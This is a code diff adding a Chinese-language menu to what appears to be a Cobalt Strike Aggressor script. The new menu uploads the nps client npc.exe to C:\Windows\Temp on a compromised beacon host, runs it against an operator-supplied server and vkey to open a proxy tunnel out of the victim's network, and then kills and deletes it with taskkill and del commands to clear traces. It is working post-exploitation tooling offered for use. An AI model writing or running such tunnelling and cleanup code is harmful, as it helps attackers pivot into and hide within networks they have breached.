@@ -45,6 +45,49 @@ menu "内网穿透" {
 		}
 	}
 
+	menu "nps(无配置文件落地)" {
+		item "上传npc" {
+			$bid = $1;
+			$dialog = dialog("上传npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
+			dialog_description($dialog,"一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。项目地址：https://github.com/ehang-io/nps");
+			drow_text($dialog, "UploadPath",  "上传路径: ");
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub npc_upload {
+			bcd($bid, $3['UploadPath']);
+			bcd($bid, $3['UploadPath']);
+			bupload($bid, script_resource("/scripts/Intranet agent/npc.exe"));
+		}
+		item "运行npc"{
+			$bid = $1['@'];
+			$Dialog = dialog("运行npc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
+			dialog_description($Dialog, "运行npc，无配置文件落地，使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。");
+			drow_text($Dialog, "server", "server: ");
+			drow_text($Dialog, "vkey", "vkey: ");
+			dbutton_action($Dialog, "运行");
+			dialog_show($Dialog);
+		}
+		sub npc_run{
+			local('$server $vkey');
+			$server = $3['server'];
+			$vkey = replace($3['vkey'], "\"", "");
+			bshell($bid, "npc.exe -server= $+ $server -vkey= $+ $vkey");
+		}
+		item "停止npc"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im npc.exe");
+			}
+		}
+		item "删除npc"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im npc.exe & del /f /s /q npc.exe");
+			}
+		}
+	}
+
 	menu "NATBypass(端口转发)" {
 		item "上传nb" {
 			$bid = $1;
